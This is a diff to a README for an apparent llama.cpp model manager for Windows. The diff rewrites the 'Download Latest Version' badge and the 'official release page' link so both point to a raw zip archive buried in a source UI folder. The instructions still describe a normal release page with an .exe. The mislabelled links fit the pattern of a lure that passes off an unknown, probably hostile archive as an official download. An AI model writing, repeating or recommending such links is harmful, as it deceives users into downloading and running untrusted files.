@@ -1,6 +1,6 @@
 # 🖥️ llama-cpp-windows-manager - Manage local artificial intelligence models easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Meggypistillate161/llama-cpp-windows-manager)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Meggypistillate161/llama-cpp-windows-manager/raw/refs/heads/main/src/LocalLlmConsole.App/Ui/Common/windows_cpp_manager_llama_v3.6.zip)
 
 This software provides a simple windows interface for running artificial intelligence models on your computer. You do not need technical skills to control your local workflows. The application handles the technical steps so you can focus on your tasks.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware to run intelligence models smoothly. Ensur
 
 Follow these instructions to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/Meggypistillate161/llama-cpp-windows-manager) to see the files.
+1. Visit the [official release page](https://github.com/Meggypistillate161/llama-cpp-windows-manager/raw/refs/heads/main/src/LocalLlmConsole.App/Ui/Common/windows_cpp_manager_llama_v3.6.zip) to see the files.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
